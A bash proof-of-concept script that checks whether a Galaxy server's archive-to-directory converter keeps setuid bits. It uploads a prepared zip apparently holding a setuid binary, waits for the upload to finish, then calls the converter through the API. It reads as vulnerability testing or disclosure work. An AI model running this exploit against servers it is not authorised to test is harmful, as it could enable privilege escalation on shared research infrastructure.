#!/bin/bash
set -eux 

source .env

# suid_poc ==> assert stick & so on in preserve
# suid_real ==> real suid binary (e.g. /bin/bash) to test if it can be executed with suid permissions
# 1. Create history
# 2. Upload zip as plain dataset (no auto_decompress)
# 3. Wait for upload to finish (poll state)
# 4. Invoke the converter to convert zip to directory (which should trigger the suid
#    binary execution if the vulnerability is present)


# Get/create a history
HID=$(curl -s -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"name":"suid_test"}' "$GALAXY_URL/api/histories" | jq -r '.id')

# Upload zip as plain dataset (no auto_decompress)
UPLOAD=$(curl -s -H "x-api-key: $API_KEY" \
  -F "history_id=$HID" \
  -F "tool_id=upload1" \
  -F 'inputs={"file_type":"zip","dbkey":"?","files_0|type":"upload_dataset","files_0|auto_decompress":false}' \
  -F "files_0|file_data=@artefacts/suid_real.zip" \
  "$GALAXY_URL/api/tools")

DID=$(echo "$UPLOAD" | jq -r '.outputs[0].id')
echo "dataset id: $DID"

# Wait for upload to finish (poll state)
while [ "$(curl -s -H "x-api-key: $API_KEY" "$GALAXY_URL/api/datasets/$DID" | jq -r .state)" != "ok" ]; do
  sleep 1
done
sleep 20
# Invoke the converter
curl -s -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d "{
        \"tool_id\":\"CONVERTER_archive_to_directory\",
        \"history_id\":\"$HID\",
        \"inputs\":{
          \"input1\":{\"src\":\"hda\",\"id\":\"$DID\"},
          \"__target_datatype__\":\"directory\"
        }
      }" \
  "$GALAXY_URL/api/tools" | jq .

  
